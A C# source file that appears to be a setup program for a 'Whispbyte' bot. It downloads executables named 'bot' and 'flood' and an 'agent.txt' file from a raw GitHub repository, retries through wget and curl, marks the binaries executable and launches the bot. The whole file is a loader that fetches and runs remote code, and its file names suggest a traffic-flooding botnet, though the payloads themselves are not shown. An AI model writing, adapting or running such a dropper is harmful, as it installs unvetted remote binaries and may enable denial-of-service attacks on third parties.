using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace SetupBotsWhispbyte
{
    class Program
    {
        private const string RepoBase = "https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main";

        private static readonly (string Url, string Filename, bool Executable)[] FilesToDownload = new[]
        {
            ($"{RepoBase}/bots/bot", "bot", true),
            ($"{RepoBase}/bots/flood", "flood", true),
            ($"{RepoBase}/agent.txt", "agent.txt", false)
        };

        static async Task<int> Main(string[] args)
        {
            string targetDir = Directory.GetCurrentDirectory();
            Console.WriteLine($"[+] Setting up Whispbyte Bot in: {targetDir}");

            using var httpClient = new HttpClient();

            foreach (var item in FilesToDownload)
            {
                string dest = Path.Combine(targetDir, item.Filename);
                try
                {
                    Console.Write($"[*] Downloading {item.Filename}... ");
                    string nocacheUrl = $"{item.Url}?t={DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()}";
                    await DownloadFileAsync(httpClient, nocacheUrl, dest);
                    Console.WriteLine("OK");

                    if (item.Executable && !RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    {
                        Chmod(dest, 0755);
                        Console.WriteLine($"[+] Set chmod +x for {item.Filename}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("FAILED");
                    Console.Error.WriteLine($"[!] Error downloading {item.Filename}: {ex.Message}");
                }
            }

            string botBinPath = Path.Combine(targetDir, "bot");
            if (File.Exists(botBinPath))
            {
                Console.WriteLine("[+] Launching Bot process (attached to container)...");
                try
                {
                    var startInfo = new ProcessStartInfo
                    {
                        FileName = botBinPath,
                        WorkingDirectory = targetDir,
                        UseShellExecute = false,
                        RedirectStandardInput = false,
                        RedirectStandardOutput = false,
                        RedirectStandardError = false
                    };

                    using var process = Process.Start(startInfo);
                    if (process == null)
                    {
                        Console.Error.WriteLine("[-] Failed to start bot process.");
                        return 1;
                    }

                    Console.CancelKeyPress += (s, e) =>
                    {
                        try
                        {
                            if (!process.HasExited) process.Kill();
                        }
                        catch { }
                    };

                    process.WaitForExit();
                    Console.WriteLine($"[!] Bot process exited with code {process.ExitCode}");
                    return process.ExitCode;
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($"[!] Error starting bot: {ex.Message}");
                    return 1;
                }
            }
            else
            {
                Console.Error.WriteLine("[-] Bot binary not found, execution skipped.");
                return 1;
            }
        }

        private static async Task DownloadFileAsync(HttpClient client, string url, string destPath)
        {
            try
            {
                var response = await client.GetAsync(url);
                if (response.IsSuccessStatusCode)
                {
                    await using var fs = new FileStream(destPath, FileMode.Create, FileAccess.Write, FileShare.None);
                    await response.Content.CopyToAsync(fs);
                    await fs.FlushAsync();
                    if (new FileInfo(destPath).Length > 0) return;
                }
            }
            catch { }

            if (DownloadWgetOrCurl(url, destPath))
            {
                return;
            }

            throw new Exception($"Failed to download from {url}");
        }

        private static bool DownloadWgetOrCurl(string url, string destPath)
        {
            try
            {
                using var proc = Process.Start(new ProcessStartInfo
                {
                    FileName = "wget",
                    Arguments = $"-q -O \"{destPath}\" \"{url}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                proc?.WaitForExit();
                if (File.Exists(destPath) && new FileInfo(destPath).Length > 0) return true;
            }
            catch { }

            try
            {
                using var proc = Process.Start(new ProcessStartInfo
                {
                    FileName = "curl",
                    Arguments = $"-s -L -o \"{destPath}\" \"{url}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                proc?.WaitForExit();
                if (File.Exists(destPath) && new FileInfo(destPath).Length > 0) return true;
            }
            catch { }

            return false;
        }

        private static void Chmod(string path, int mode)
        {
            try
            {
                using var proc = Process.Start(new ProcessStartInfo
                {
                    FileName = "chmod",
                    Arguments = $"755 \"{path}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
                proc?.WaitForExit();
            }
            catch { }
        }
    }
}
